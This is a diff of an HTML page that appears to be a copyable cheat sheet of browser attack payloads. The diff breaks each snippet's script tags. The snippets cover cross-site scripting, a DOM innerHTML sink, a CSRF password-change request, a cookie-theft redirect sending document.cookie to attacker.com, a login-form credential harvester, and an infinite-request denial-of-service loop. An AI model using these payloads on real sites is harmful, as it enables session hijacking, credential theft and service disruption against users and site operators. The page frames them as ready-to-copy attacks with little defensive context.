@@ -896,9 +896,9 @@ int main() {
         <p class="text-gray-200 mb-2">Injecting a script to execute malicious actions in the victim's browser.</p>
         <div class="code-block">
           <pre id="basic_xss_js">
-<script>
+script>
   alert('XSS Attack!');
-</script>
+/script>
           </pre>
         </div>
         <button onclick="copyToClipboard('basic_xss_js')" class="copy-btn">Copy</button>
@@ -910,10 +910,10 @@ int main() {
         <p class="text-gray-200 mb-2">Manipulating the DOM to execute malicious scripts.</p>
         <div class="code-block">
           <pre id="dom_xss_js">
-<script>
+script>
   let user_input = window.location.hash.substring(1);
   document.getElementById("output").innerHTML = user_input; // Vulnerable to XSS
-</script>
+/script>
           </pre>
         </div>
         <button onclick="copyToClipboard('dom_xss_js')" class="copy-btn">Copy</button>
@@ -927,11 +927,11 @@ int main() {
         <p class="text-gray-200 mb-2">Using malicious scripts to trigger actions on a website that the victim is authenticated to.</p>
         <div class="code-block">
           <pre id="csrf_js">
-<script>
+script>
   let img = new Image();
   img.src = "http://victim.com/change-password?new_password=attackerpassword";
   document.body.appendChild(img); // Sends request as victim
-</script>
+/script>
           </pre>
         </div>
         <button onclick="copyToClipboard('csrf_js')" class="copy-btn">Copy</button>
@@ -945,7 +945,7 @@ int main() {
         <p class="text-gray-200 mb-2">Intercepting HTTP requests and modifying headers or payloads in transit.</p>
         <div class="code-block">
           <pre id="http_sniffing_js">
-<script>
+script>
   let xhr = new XMLHttpRequest();
   xhr.open("GET", "http://victim.com/secret-data", true);
   xhr.onreadystatechange = function () {
@@ -954,7 +954,7 @@ int main() {
     }
   };
   xhr.send();
-</script>
+/script>
           </pre>
         </div>
         <button onclick="copyToClipboard('http_sniffing_js')" class="copy-btn">Copy</button>
@@ -968,9 +968,9 @@ int main() {
         <p class="text-gray-200 mb-2">Stealing authentication cookies to hijack a session.</p>
         <div class="code-block">
           <pre id="cookie_theft_js">
-<script>
+script>
   document.location = "http://attacker.com/steal?cookie=" + document.cookie;
-</script>
+/script>
           </pre>
         </div>
         <button onclick="copyToClipboard('cookie_theft_js')" class="copy-btn">Copy</button>
@@ -982,7 +982,7 @@ int main() {
         <p class="text-gray-200 mb-2">Capturing usernames and passwords submitted through a form.</p>
         <div class="code-block">
           <pre id="credential_harvest_js">
-<script>
+script>
   document.getElementById('loginForm').addEventListener('submit', function(event) {
     event.preventDefault();
     let username = document.getElementById('username').value;
@@ -993,7 +993,7 @@ int main() {
       headers: { 'Content-Type': 'application/json' }
     });
   });
-</script>
+/script>
           </pre>
         </div>
         <button onclick="copyToClipboard('credential_harvest_js')" class="copy-btn">Copy</button>
@@ -1007,14 +1007,14 @@ int main() {
         <p class="text-gray-200 mb-2">Overloading the victim's browser or server with excessive requests.</p>
         <div class="code-block">
           <pre id="dos_js">
-<script>
+script>
   function dosAttack() {
     while (true) {
       fetch('http://victim.com');
     }
   }
   dosAttack(); // Launches infinite requests
-</script>
+/script>
           </pre>
         </div>
         <button onclick="copyToClipboard('dos_js')" class="copy-btn">Copy</button>
